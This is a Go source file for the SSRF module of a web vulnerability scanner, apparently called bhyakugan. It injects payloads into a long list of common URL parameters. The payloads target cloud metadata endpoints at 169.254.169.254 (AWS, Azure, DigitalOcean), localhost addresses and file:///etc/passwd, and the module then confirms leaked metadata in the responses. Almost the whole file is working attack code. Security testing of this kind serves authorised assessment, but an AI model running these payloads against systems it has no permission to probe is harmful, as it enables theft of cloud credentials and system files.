package ssrf

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"

	"github.com/yupiyy/bhyakugan/internal/core"
)

type SSRFPayload struct {
	Name    string
	Payload string
	Check   string // String to look for in response
}

var SSRFParams = []string{
	"url", "u", "next", "path", "dest", "destination", "redirect", "uri",
	"callback", "checkout", "feed", "download", "document", "folder",
	"root", "inc", "include", "require", "api", "rest", "source", "src",
	"data", "base", "file", "page", "template", "layout", "view", "dir",
	"action", "command", "exec", "query", "q", "search", "s",
}

var SSRFPayloads = []SSRFPayload{
	// --- Cloud Metadata ---
	{"SSRF Cloud (AWS/GCP)", "http://169.254.169.254/latest/meta-data/", "ami-id"},
	{"SSRF Cloud (Azure)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"},
	{"SSRF Cloud (DigitalOcean)", "http://169.254.169.254/metadata/v1.json", "droplet_id"},

	// --- Localhost Bypass ---
	{"SSRF Localhost (IPv4)", "http://127.0.0.1", "Connection refused"}, 
	{"SSRF Localhost (Rare)", "http://0/", "Connection refused"},

	// --- File Scheme ---
	{"SSRF File Scheme", "file:///etc/passwd", "root:x:"},
}

// Scan tests for SSRF vulnerabilities
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	// 0. Baseline (Control)
	baseResp, err := client.Get(baseURL + "?bhyakugan_ssrf_control=http://example.com/safe")
	baseBody := ""
	if err == nil {
		defer baseResp.Body.Close()
		b, _ := io.ReadAll(baseResp.Body)
		baseBody = string(b)
	}

	// Store findings locally first for grouping
	var vulnParams []string
	var confirmedPayload string
	var evidenceSnippet string
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Semaphore to control concurrency
	sem := make(chan struct{}, 5) 

	for _, param := range SSRFParams {
		wg.Add(1)
		go func(pName string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			for _, payload := range SSRFPayloads {
				target := fmt.Sprintf("%s?%s=%s", baseURL, pName, payload.Payload)
				
				resp, err := client.Get(target)
				if err != nil {
					continue
				}
				defer resp.Body.Close()

				bodyBytes, _ := io.ReadAll(resp.Body)
				bodyStr := string(bodyBytes)

				// Validation Logic
				if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(payload.Check)) {
					// False Positive Check: Baseline Comparison
					if baseBody != "" && strings.Contains(strings.ToLower(baseBody), strings.ToLower(payload.Check)) {
						continue 
					}

					// Rule: Structural Verification (Anti-FP)
					isConfirmed := false
					
					// 1. Check for Metadata Headers (Strong Indicator)
					if resp.Header.Get("Metadata-Flavor") != "" || resp.Header.Get("X-Google-Metadata-Request") != "" {
						isConfirmed = true
					}

					// 2. Check for characteristic JSON structure if applicable
					if strings.HasPrefix(strings.TrimSpace(bodyStr), "{") || strings.HasPrefix(strings.TrimSpace(bodyStr), "[") {
						// Most Cloud Metadata APIs return JSON (Azure, DO, etc.)
						if strings.Contains(bodyStr, "\"") && strings.Contains(bodyStr, ":") {
							isConfirmed = true
						}
					}

					// 3. For AWS text-based metadata, check for common keys
					if strings.Contains(payload.Name, "AWS") && (strings.Contains(bodyStr, "instance-id") || strings.Contains(bodyStr, "local-hostname")) {
						isConfirmed = true
					}

					if !isConfirmed {
						continue // If just keyword match without structure, discard as potential reflection
					}

					mu.Lock()
					vulnParams = append(vulnParams, pName)
					if confirmedPayload == "" {
						confirmedPayload = payload.Payload
						// Capture a snippet of the response for evidence (max 100 chars)
						idx := strings.Index(strings.ToLower(bodyStr), strings.ToLower(payload.Check))
						end := idx + 50
						if end > len(bodyStr) { end = len(bodyStr) }
						start := idx - 20
						if start < 0 { start = 0 }
						evidenceSnippet = strings.ReplaceAll(bodyStr[start:end], "\n", " ")
					}
					mu.Unlock()
					break // Found a vuln for this param, move to next param
				}
			}
		}(param)
	}
	wg.Wait()

	if len(vulnParams) > 0 {
		// Dedup params just in case
		uniqueParams := make(map[string]bool)
		var cleanParams []string
		for _, v := range vulnParams {
			if !uniqueParams[v] {
				uniqueParams[v] = true
				cleanParams = append(cleanParams, v)
			}
		}

		fmt.Printf("[!] POSITIVE MATCH: SSRF on %s (Params: %s)\n", baseURL, strings.Join(cleanParams, ", "))
		onFound(core.Finding{
			Type:     "SSRF Injection",
			Target:   baseURL, // Target is the endpoint, not the full param URL
			Detail:   fmt.Sprintf("Cloud Metadata/Internal Access via parameters: %s. Evidence: '%s' found with payload '%s'", strings.Join(cleanParams, ", "), evidenceSnippet, confirmedPayload),
			Severity: "Critical",
		})
	}
}
